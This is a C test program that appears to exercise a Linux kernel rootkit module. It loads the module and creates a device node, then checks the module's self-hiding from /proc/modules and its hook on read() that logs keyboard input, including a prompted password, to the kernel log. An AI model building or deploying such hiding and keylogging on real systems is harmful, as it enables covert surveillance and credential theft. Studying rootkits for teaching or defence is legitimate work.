#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/klog.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/sysmacros.h>
#include <unistd.h>

#include "rootkit.h"

_Noreturn static void fatal_error(const char *msg) {
    fprintf(stderr, "error: %s\n", msg);
    exit(0);
}

_Noreturn static void fatal_errno() { fatal_error(strerror(errno)); }

static int load_rootkit() {
    int fd = open("./rootkit.ko", O_RDONLY);
    if (fd < 0)
        fatal_errno();
    int ret = syscall(SYS_finit_module, fd, "", 0);
    if (ret)
        fatal_errno();
    ssize_t len = klogctl(10, NULL, 0);
    char *buf = (char *)malloc(len);
    if (!buf)
        fatal_errno();
    len = klogctl(3, buf, len);
    if (len < 0)
        fatal_errno();
    int i = len - 1;
    for (; i >= 0 && buf[i] != ' '; i--)
        ;
    int major = (int)strtol(buf + i + 1, NULL, 10);
    free(buf);
    // printf("Module loaded! Major number is %d\n", major);
    ret = mknod("/dev/rootkit", S_IFCHR | S_IRUSR | S_IWUSR, makedev(major, 0));
    if (ret)
        fatal_errno();
    // printf("/dev/rootkit is made\n");
    return major;
}

static void unload_rootkit(int major) {
    int ret = unlink("/dev/rootkit");
    if (ret)
        fatal_errno();
    // printf("/dev/rootkit deleted\n");
    ret = syscall(SYS_delete_module, "rootkit", 0);
    if (ret)
        fatal_errno();
    // printf("rootkit removed\n");
}

static int open_rootkit(void) {
    int fd = open("/dev/rootkit", O_RDWR);
    if (fd < 0) {
        fatal_error("[open rootkit error]\n");
    }
    return fd;
}

static int test_do_nothing(void) {
    int major = load_rootkit();
    unload_rootkit(major);
    return 0;
}

static int has_rootkit(void) {
    FILE *fp = fopen("/proc/modules", "r");
    if (!fp)
        fatal_errno();
    char buf[1024 + 1];
    int flag = 0;
    while (fscanf(fp, "%1024s%*256[^\n]%*c", buf) != EOF) {
        if (!strncmp("rootkit", buf, 8))
            flag = 1;
    }
    int ret = fclose(fp);
    if (ret)
        fatal_errno();
    return flag;
}

static int test_hide(void) {
    int major = load_rootkit();

    if (!has_rootkit()) {
        fprintf(stderr, "rootkit not loaded!\n");
        return -1;
    }

    int ioctl_fd = open_rootkit();

    ioctl(ioctl_fd, IOCTL_MOD_HIDE);
    if (has_rootkit()) {
        fprintf(stderr, "rootkit still visible\n");
        return -1;
    }

    ioctl(ioctl_fd, IOCTL_MOD_HIDE);
    if (!has_rootkit()) {
        fprintf(stderr, "rootkit still invisible\n");
        return -1;
    }

    int ret = close(ioctl_fd);
    if (ret)
        fatal_errno();

    unload_rootkit(major);
    return 0;
}

static void get_keyboard_input() {
    ssize_t len = klogctl(10, NULL, 0);
    char *buf = (char *)malloc(len);
    if (!buf)
        fatal_errno();
    system("dmesg > /dev/null");
    len = klogctl(3, buf, len);
    if (len < 0)
        fatal_errno();
    char *line = strtok(buf, "\n");
    while (line != NULL) {
        if (!strncmp(line, "<6>read from stdin ", 19))
            printf("GOT %s\n", line + 19);
        line = strtok(NULL, "\n");
    }
    free(buf);
}

static int test_hook_read(void) {
    int major = load_rootkit();
    int ioctl_fd = open_rootkit();

    ioctl(ioctl_fd, IOCTL_MOD_HOOK);

    (void) klogctl(5, NULL, 0);
    printf("Please enter your (fake) password through keyboard.\n");
    char buf[128];
    fgets(buf, 127, stdin);
    get_keyboard_input();

    int ret = close(ioctl_fd);
    if (ret)
        fatal_errno();
    unload_rootkit(major);
    return 0;
}

int main(void) {
    typedef int (*Test)(void);
    Test tests[] = {test_do_nothing, test_hide, test_hook_read, NULL};
    for (int i = 0; tests[i]; i++) {
        if (tests[i]() == 0)
            printf("Passed\n");
        else
            printf("Failed\n");
    }
    return 0;
}
